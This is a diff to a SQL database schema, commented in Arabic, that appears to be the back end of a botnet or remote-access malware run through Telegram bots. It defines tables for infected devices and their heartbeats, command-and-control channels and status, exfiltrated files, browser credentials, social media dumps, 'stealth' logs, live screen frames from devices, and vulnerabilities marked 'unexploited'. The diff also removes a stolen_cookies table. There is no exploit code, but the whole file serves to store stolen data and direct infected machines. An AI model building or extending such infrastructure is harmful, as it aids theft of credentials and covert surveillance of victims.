@@ -1,4 +1,7 @@
 -- database/complete_schema.sql (نفذ في كل مشروع من المشاريع الأربعة)
+-- ============================================================
+-- 1. تنظيف البيئة (حذف الجداول القديمة)
+-- ============================================================
 DROP TABLE IF EXISTS sessions CASCADE;
 DROP TABLE IF EXISTS banned_chats CASCADE;
 DROP TABLE IF EXISTS notification_logs CASCADE;
@@ -18,10 +21,18 @@ DROP TABLE IF EXISTS social_dumps CASCADE;
 DROP TABLE IF EXISTS ai_tasks CASCADE;
 DROP TABLE IF EXISTS ai_results CASCADE;
 DROP TABLE IF EXISTS c2_channels CASCADE;
+DROP TABLE IF EXISTS c2_status CASCADE;
 DROP TABLE IF EXISTS stealth_logs CASCADE;
 DROP TABLE IF EXISTS error_logs CASCADE;
-DROP TABLE IF EXISTS c2_status CASCADE;
+DROP TABLE IF EXISTS discovered_vulnerabilities CASCADE;
+DROP TABLE IF EXISTS heartbeat CASCADE;
+DROP TABLE IF EXISTS bot_status CASCADE;
+DROP TABLE IF EXISTS config CASCADE;
+DROP TABLE IF EXISTS live_frames CASCADE;
 
+-- ============================================================
+-- 2. إدارة الوصول والأمان
+-- ============================================================
 CREATE TABLE sessions (
     chat_id BIGINT PRIMARY KEY,
     last_activity TIMESTAMPTZ DEFAULT now(),
@@ -33,6 +44,9 @@ CREATE TABLE banned_chats (
     banned_at TIMESTAMPTZ DEFAULT now()
 );
 
+-- ============================================================
+-- 3. إدارة الأجهزة والاتصال
+-- ============================================================
 CREATE TABLE pos_clients (
     Entry_id BIGSERIAL PRIMARY KEY,
     Client_serial TEXT UNIQUE NOT NULL,
@@ -54,6 +68,64 @@ CREATE TABLE device_keys (
     Expiry BIGINT NOT NULL
 );
 
+CREATE TABLE heartbeat (
+    id BIGSERIAL PRIMARY KEY,
+    device_id TEXT REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    last_ping TIMESTAMPTZ DEFAULT now(),
+    battery_level INT,
+    network_type TEXT
+);
+
+-- ============================================================
+-- 4. إدارة البوتات (جداول جديدة ضرورية)
+-- ============================================================
+CREATE TABLE bot_status (
+    bot_id TEXT PRIMARY KEY,               -- معرف البوت (مثل master, stream, project1)
+    bot_token_enc TEXT NOT NULL,           -- التوكن مشفر (أو مرجع في Vault)
+    last_ping TIMESTAMPTZ DEFAULT now(),
+    is_active BOOLEAN DEFAULT true,
+    fail_count INT DEFAULT 0,
+    role TEXT                               -- رئيسي، احتياطي، بث، إلخ
+);
+
+CREATE TABLE c2_channels (
+    Channel_id BIGSERIAL PRIMARY KEY,
+    Channel_type TEXT NOT NULL,
+    Channel_name TEXT,
+    Is_active BOOLEAN DEFAULT true,
+    Last_used TIMESTAMPTZ DEFAULT now(),
+    Usage_count BIGINT DEFAULT 0
+);
+
+CREATE TABLE c2_status (
+    Id BIGSERIAL PRIMARY KEY,
+    Channel TEXT,
+    Status TEXT,
+    Last_check TIMESTAMPTZ DEFAULT now(),
+    Error_message TEXT
+);
+
+CREATE TABLE config (
+    key TEXT PRIMARY KEY,
+    value TEXT NOT NULL,
+    updated_at TIMESTAMPTZ DEFAULT now()
+);
+
+-- ============================================================
+-- 5. البث المباشر (جديد)
+-- ============================================================
+CREATE TABLE live_frames (
+    id BIGSERIAL PRIMARY KEY,
+    session_id TEXT NOT NULL,
+    device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    frame_enc TEXT NOT NULL,   -- الإطار مشفر
+    created_at TIMESTAMPTZ DEFAULT now()
+);
+CREATE INDEX idx_live_frames_session ON live_frames(session_id);
+
+-- ============================================================
+-- 6. المهام والأوامر
+-- ============================================================
 CREATE TABLE service_requests (
     Ticket_id BIGSERIAL PRIMARY KEY,
     Target_client TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
@@ -65,13 +137,9 @@ CREATE TABLE service_requests (
     Last_updated TIMESTAMPTZ DEFAULT now()
 );
 
-CREATE TABLE stolen_cookies (
-    Id BIGSERIAL PRIMARY KEY,
-    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
-    Cookies JSONB NOT NULL,
-    Timestamp TIMESTAMPTZ DEFAULT now()
-);
-
+-- ============================================================
+-- 7. استخراج البيانات
+-- ============================================================
 CREATE TABLE exfil (
     Id BIGSERIAL PRIMARY KEY,
     Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
@@ -107,6 +175,19 @@ CREATE TABLE social_dumps (
     Dumped_at TIMESTAMPTZ DEFAULT now()
 );
 
+-- ============================================================
+-- 8. تحليل الثغرات والذكاء الاصطناعي
+-- ============================================================
+CREATE TABLE discovered_vulnerabilities (
+    Id BIGSERIAL PRIMARY KEY,
+    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Vulnerability_type TEXT,
+    Severity TEXT,
+    Discovery_data JSONB,
+    Status TEXT DEFAULT 'unexploited',
+    Found_at TIMESTAMPTZ DEFAULT now()
+);
+
 CREATE TABLE ai_tasks (
     Task_id BIGSERIAL PRIMARY KEY,
     Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
@@ -126,15 +207,9 @@ CREATE TABLE ai_results (
     Created_at TIMESTAMPTZ DEFAULT now()
 );
 
-CREATE TABLE c2_channels (
-    Channel_id BIGSERIAL PRIMARY KEY,
-    Channel_type TEXT NOT NULL,
-    Channel_name TEXT,
-    Is_active BOOLEAN DEFAULT true,
-    Last_used TIMESTAMPTZ DEFAULT now(),
-    Usage_count BIGINT DEFAULT 0
-);
-
+-- ============================================================
+-- 9. السجلات
+-- ============================================================
 CREATE TABLE stealth_logs (
     Log_id BIGSERIAL PRIMARY KEY,
     Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
@@ -149,53 +224,28 @@ CREATE TABLE error_logs (
     Error_code TEXT NOT NULL,
     Error_message TEXT,
     Module TEXT,
-    Stack_trace TEXT,
-    Timestamp TIMESTAMPTZ DEFAULT now(),
-    Resolved BOOLEAN DEFAULT false
+    Timestamp TIMESTAMPTZ DEFAULT now()
 );
 
-CREATE TABLE c2_status (
-    Id BIGSERIAL PRIMARY KEY,
-    Channel TEXT,
-    Status TEXT,
-    Last_check TIMESTAMPTZ DEFAULT now(),
-    Error_message TEXT
-);
-
+-- ============================================================
+-- 10. الفهارس
+-- ============================================================
 CREATE INDEX idx_pos_clients_serial ON pos_clients(client_serial);
-CREATE INDEX idx_requests_target ON service_requests(target_client);
-CREATE INDEX idx_cookies_device ON stolen_cookies(device_id);
 CREATE INDEX idx_exfil_device ON exfil(device_id);
-CREATE INDEX idx_exfil_type ON exfil(file_type);
-CREATE INDEX idx_creds_device ON browser_creds(device_id);
-CREATE INDEX idx_ai_results_device ON ai_results(device_id);
-CREATE INDEX idx_errors_device ON error_logs(device_id);
-CREATE INDEX idx_ai_tasks_device ON ai_tasks(device_id);
-CREATE INDEX idx_stealth_logs_device ON stealth_logs(device_id);
-CREATE INDEX idx_sessions_chat ON sessions(chat_id);
-CREATE INDEX idx_banned_chats ON banned_chats(chat_id);
+CREATE INDEX idx_requests_target ON service_requests(target_client);
+CREATE INDEX idx_heartbeat_device ON heartbeat(device_id);
+CREATE INDEX idx_vuln_device ON discovered_vulnerabilities(device_id);
+CREATE INDEX idx_bot_status_last_ping ON bot_status(last_ping);
 
-ALTER TABLE sessions ENABLE ROW LEVEL SECURITY;
-ALTER TABLE banned_chats ENABLE ROW LEVEL SECURITY;
-ALTER TABLE pos_clients ENABLE ROW LEVEL SECURITY;
-ALTER TABLE device_keys ENABLE ROW LEVEL SECURITY;
-ALTER TABLE service_requests ENABLE ROW LEVEL SECURITY;
-ALTER TABLE stolen_cookies ENABLE ROW LEVEL SECURITY;
-ALTER TABLE exfil ENABLE ROW LEVEL SECURITY;
-ALTER TABLE browser_creds ENABLE ROW LEVEL SECURITY;
-ALTER TABLE social_dumps ENABLE ROW LEVEL SECURITY;
-ALTER TABLE ai_tasks ENABLE ROW LEVEL SECURITY;
-ALTER TABLE ai_results ENABLE ROW LEVEL SECURITY;
-ALTER TABLE c2_channels ENABLE ROW LEVEL SECURITY;
-ALTER TABLE stealth_logs ENABLE ROW LEVEL SECURITY;
-ALTER TABLE error_logs ENABLE ROW LEVEL SECURITY;
-ALTER TABLE c2_status ENABLE ROW LEVEL SECURITY;
-
+-- ============================================================
+-- 11. تفعيل RLS لجميع الجداول
+-- ============================================================
 DO $$
 DECLARE
     tbl text;
 BEGIN
     FOR tbl IN (SELECT table_name FROM information_schema.tables WHERE table_schema = 'public') LOOP
+        EXECUTE format('ALTER TABLE %I ENABLE ROW LEVEL SECURITY', tbl);
         EXECUTE format('DROP POLICY IF EXISTS "Service role full access" ON %I', tbl);
         EXECUTE format('CREATE POLICY "Service role full access" ON %I FOR ALL USING (auth.role() = ''service_role'')', tbl);
     END LOOP;
